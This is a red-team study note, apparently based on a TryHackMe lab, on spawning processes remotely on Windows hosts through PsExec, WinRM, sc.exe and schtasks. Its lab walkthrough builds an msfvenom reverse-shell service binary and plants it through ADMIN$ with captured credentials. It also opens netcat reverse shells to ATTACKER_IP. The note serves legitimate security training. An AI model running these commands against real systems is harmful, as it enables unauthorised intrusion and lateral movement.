---
{"dg-publish":true,"permalink":"/cards/red-team/spawning-process-remotely/"}
---

~ [[cards/red-team/lateral movement and pivoting\|lateral movement and pivoting]]
## Summary
---
**What it is:** Technique for initiating a process on a remote Windows host using native management interfaces (SMB/RPC, WinRM, Service Control Manager, Scheduled Tasks).  
**Scope:** Covers conceptual mechanisms for remote process creation; excludes tooling-specific payloads, exploitation details, and command syntax.  
**Key Topics:** [[cards/active-directory/Server Message Block (SMB)\|Server Message Block (SMB)]], [[WinRM\|WinRM]], [[cards/blue-team/endpoint-security/Windows Services Analysis\|Windows Services]], [[cards/blue-team/endpoint-security/Windows Scheduled Tasks\|Windows Scheduled Tasks]], [[cards/red-team/lateral movement and pivoting\|lateral movement and pivoting]]

## How it works (2–4 lines)
---
This technique leverages built-in Windows management interfaces (SMB, RPC, WinRM) to create processes or services on remote hosts. Administrators commonly use these mechanisms for legitimate tasks like software deployment, maintenance, or scheduled task execution, which attackers can mimic for lateral movement.

## Steps
---
Spawn a process remotely, allowing them to run commands on machines where they have valid credentials.

**PSexec:**

- **Ports:** 445/TCP (SMB)
- **Required Group Memberships:** Administrators

A go to method to run commands remotely on any PC and this tool is available in one of the many tools of Sysinternals.

1. Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.
3. Create some named pipes to handle stdin/stdout/stderr.


![lateral movement and pivoting-xxzz.png|500](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting-xxzz.png)

To run psexec, we only need to supply the required administrator credentials for the remote host and the command we want to run (`psexec64.exe` is available under `C:\tools` in THMJMP2 for your convenience):

```C
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

**Remote Process Creation Using WinRM:**

- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Remote Management Users

It is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.

```C
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

Same thing from PowerShell by first establishing PSCredential object:

```PowerShell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
```

Creat interactive session from the PSCredential Object by using the Enter-PSSession cmdlet:

```PowerShell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

**Remotely Creating Services Using sc:**

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCE/RPC)
    - 445/TCP (RPC over SMB Named Pipes)
    - 139/TCP (RPC over SMB Named Pipes)
- **Required Group Memberships:** Administrators

Windows services can also be leveraged to run arbitrary commands since they execute a command when started. If you configure a Windows service to run any application, it will still execute it and fail afterwards.

You can create a service on a remote host with sc.exe, a standard tool available in Windows. When using sc, it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several ways:

1. A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.
2. (OR) If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).

```PowerShell
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

When the service started the `net` command will be executed -- creating a new local user on the system, no output is shown since the Operating system is in change of starting the service.

```PowerShell
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

**Scheduled Tasks:**

You can create and run one remotely with schtasks, available in any Windows installation:

```PowerShell
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```

You set the schedule type (/sc) to ONCE, which means the task is intended to be run only once at the specified time and date. Since we will be running the task manually, the starting date (/sd) and starting time (/st) won't matter much anyway. No output is shown since Operating System is in charge.

```C
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```


### Sample Workflow
---
**Note:** Requires a **captured** credentials with administrative access:

- **User:** ZA.TRYHACKME.COM\t1_leonard.summers
- **Password:** EZpass4ever
- **Objective:** Move from THMJMP (currently logged in Windows as user **jenna**) to THMISS.

The service manager in Windows only executes `exe-service` executables while the executable we know will not work and therefore killed by the service manager. msfvenom luckily supports this type of executable:

```C
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.150.74.13 LPORT=4445 -o leservice.exe
```

You will then proceed to use **t1_leonard.summers** credentials to upload your payload to the ADMIN$ share of THMIIS using smbclient:

```C
smbclient -c 'put leservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

Next setup a listener using msfconsole:

```C
msfconsole -q
use exploit/multi/handler
set lhost lateralmovement
set lport 4445
set payload windows/shell/reverse_tcp
```

The `sc.exe` does not allow specifying credentials as part of the command, you need to use `runas` to spawn a new shell with t1_leonard.summer's access token. But the problem is we only have SSH access to the macine, so if you tried something like `runas /netonly /user:ZA\t1_leonard.summers cmd.exe`, the new command prompt would spawn on the [[cards/windows/windows users session\|user's session]], but we would have no access to it:

> [!info]+ what netonly do
> It spawns a new process **in your current session** (same session as your SSH shell), under your current _local_ access token. The supplied username/password are only used when that process makes **network** requests to remote servers.

![lateral movement and pivoting-1.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting-1.png)

To overcome this problem, we can use runas to spawn a second reverse shell with t1_leonard.summers access token

```C
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```

Listening server:

```C
nc -lvp 4443
```

![lateral movement and pivoting-2.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting-2.png)
**Note:** We are still at **THMJMP2** machine at this point and remember to input the administrator correct password.

Then finally for our malicious binary using our new administrative access shell, **proceed** to create a new service remotely using `sc.exe`:

**Remember**, we uploaded our malicious binary in the `ADMIN$` share of THMISS machine using **smbclient**.

```C
sc.exe \\thmiis.za.tryhackme.com create THMservice-3259 binPath= "%windir%\leservice.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start THMservice-3259
```

Output:

![lateral movement and pivoting-3.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting-3.png)

Then back to our `msfvenom` console listener:

![lateral movement and pivoting-4.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting-4.png)